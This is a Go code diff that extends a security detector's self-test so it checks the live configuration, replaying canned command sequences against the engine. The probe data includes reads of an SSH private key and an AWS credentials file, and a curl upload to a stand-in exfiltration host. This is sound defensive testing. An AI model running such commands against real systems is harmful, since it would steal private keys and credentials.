@@ -32,16 +32,28 @@ func (c *countingAppender) Append(_, _ string, _ []byte, _ bool) error {
 	return nil
 }
 
-// SelfTest exercises the compiled rules end-to-end on a fresh engine: a canned
-// ordered exfil pair MUST fire, and a canned benign sequence (registry egress
-// with no preceding sensitive read; a lone external curl; a sensitive read with
-// no egress) MUST stay silent. It returns a non-nil error describing the first
-// broken invariant, so a doctor sec- check can prove the detector is wired and
-// non-vacuous without any host probe. It is hermetic and deterministic.
-func SelfTest(_ context.Context) error {
+// SelfTest exercises the COMPILED rules end-to-end on a fresh engine with no
+// config overlay. Kept for callers that only want to prove the shipped defaults
+// are non-vacuous; the doctor check uses SelfTestWith to prove the LIVE config.
+func SelfTest(ctx context.Context) error {
+	return SelfTestWith(ctx, Config{})
+}
+
+// SelfTestWith exercises the rules end-to-end on a fresh engine built from cfg
+// (Enabled is forced on so the probes run regardless of the operator's toggle):
+// a canned ordered exfil pair MUST fire, and a canned benign sequence (registry
+// egress with no preceding sensitive read; a lone external curl; a sensitive
+// read with only an allowlisted tailnet egress) MUST stay silent. It returns a
+// non-nil error describing the first broken invariant, so a doctor sec- check
+// can prove the RUNNING detector — its actual windows, extra paths, and egress
+// allowlist — is wired and non-vacuous without any host probe. A config that
+// loosens the allowlist enough to swallow the canned exfil host makes the
+// positive probe silent and this test fail, exactly as intended. It is hermetic
+// and deterministic.
+func SelfTestWith(_ context.Context, cfg Config) error {
 	// Positive: a home-relative SSH private key read followed immediately by an
 	// external, non-allowlisted curl upload — the canonical exfil pair.
-	fires, err := replayCount([]probeEvent{
+	fires, err := replayCount(cfg, []probeEvent{
 		{"cat", []string{"~/.ssh/id_ed25519"}},
 		{"curl", []string{"-T", "/tmp/x", "https://exfil.example.net/u"}},
 	})
@@ -49,13 +61,13 @@ func SelfTest(_ context.Context) error {
 		return err
 	}
 	if fires != 1 {
-		return fmt.Errorf("sentinel self-test: the canonical exfil pair fired %d times, want exactly 1 — the detector is vacuous or broken", fires)
+		return fmt.Errorf("sentinel self-test: the canonical exfil pair fired %d times, want exactly 1 — the detector is vacuous or broken (an over-broad egress_allowlist can cause this)", fires)
 	}
 
 	// Negative: a lone external curl with no preceding sensitive read, and a
 	// sensitive read with only an allowlisted (tailnet) egress after it. Neither
 	// may fire.
-	fires, err = replayCount([]probeEvent{
+	fires, err = replayCount(cfg, []probeEvent{
 		{"curl", []string{"https://example.org/index.html"}},
 		{"cat", []string{"~/.aws/credentials"}},
 		{"scp", []string{"/tmp/artifact", "buildhost.tail1234.ts.net:/tmp/"}},
@@ -75,12 +87,13 @@ type probeEvent struct {
 	args []string
 }
 
-// replayCount replays events through a fresh enabled engine and returns the
-// number of fired detections.
-func replayCount(events []probeEvent) (int, error) {
+// replayCount replays events through a fresh engine built from cfg (Enabled
+// forced on) and returns the number of fired detections.
+func replayCount(cfg Config, events []probeEvent) (int, error) {
+	cfg.Enabled = true
 	sink := &countingAppender{}
 	e := NewEngine(
-		Config{Enabled: true},
+		cfg,
 		WithAudit(sink),
 		WithLogger(slog.New(slog.DiscardHandler)),
 		WithClock(func() time.Time { return time.Unix(0, 0) }),
